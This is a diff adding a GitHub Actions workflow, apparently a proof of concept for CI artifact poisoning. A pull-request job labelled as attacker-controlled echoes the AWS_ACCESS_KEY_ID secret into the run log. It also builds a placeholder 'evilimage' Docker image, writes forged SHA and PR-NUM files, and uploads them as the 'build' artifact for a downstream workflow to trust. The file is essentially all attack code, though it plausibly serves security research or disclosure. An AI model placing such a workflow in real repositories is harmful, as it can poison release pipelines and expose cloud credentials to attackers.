@@ -1,0 +1,29 @@
+name: Docker
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened, ready_for_review]
+
+jobs:
+  docker-build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attacker controls the "build" artifact contents (tiny image)
+        env:
+          PR_RUN_SECRET: ${{ secrets.AWS_ACCESS_KEY_ID }}
+        run: |
+          mkdir -p ./build
+          echo PWNED-BY-ATTACKER > ./pwned
+          printf 'FROM scratch\nCOPY pwned /pwned\n' > ./Dockerfile
+          docker build -t evilimage:latest .
+          echo "evilimage" > ./build/SHA
+          echo "31337" > ./build/PR-NUM
+          docker save evilimage:latest | gzip > ./build/evilimage.tar.gz
+          ls -l ./build
+          echo "secret visible in PR run: [${PR_RUN_SECRET}]"
+
+      - name: Upload build artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: build
+          path: build/
